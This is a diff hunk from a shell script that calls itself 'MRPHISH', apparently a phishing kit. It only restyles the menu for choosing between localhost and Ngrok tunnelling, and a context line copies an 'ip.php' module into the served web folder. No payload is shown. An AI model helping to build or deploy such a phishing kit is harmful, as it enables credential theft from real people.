@@ -418,8 +418,17 @@ cp -f .Modules/ip.php .htr/www/
 
 def_tunnel_menu="2"
 smallbanner
-printf "\e[0m\e[91m [\e[0m01\e[0m\e[91m]\e[0m\e[96m LocalHost\e[0m\n"
-printf "\e[0m\e[91m [\e[0m02\e[0m\e[91m]\e[0m\e[96m Ngrok\e[0m\n"
+echo -e "\e[96m                           MRPHISH NGROK SETUP\e[96m"
+echo -e "\e[96m                        ╔═══════════════════════╗\e[0m"
+echo -e "\e[91m                        ║\e[93m FOR LOCAL HOST       \e[91m ║\e[0m"                                                             
+echo -e "\e[91m                        ║        \e[93mType\e[92m 01\e[91m        ║\e[0m"
+echo -e "\e[96m                        ║                       ║\e[91m"                                                                         
+echo -e "\e[96m                        ║         (Or)          ║\e[96m"
+echo -e "\e[96m                        ║                       ║\e[96m"
+echo -e "\e[91m                        ║ \e[93m FOR NGROK           \e[91m ║\e[0m"              
+echo -e "\e[91m                        ║        \e[93mType\e[92m 02\e[91m        ║\e[0m"
+echo -e "\e[96m                        ║                       ║"
+echo -e "\e[96m                        ╚═══════════════════════╝"
 printf "\e[0m\n"
 echo -e "╭─[TECHNOCYBER]" |lolcat
 read -p "   ╰─root@2Timeowl=" tunnel_menu
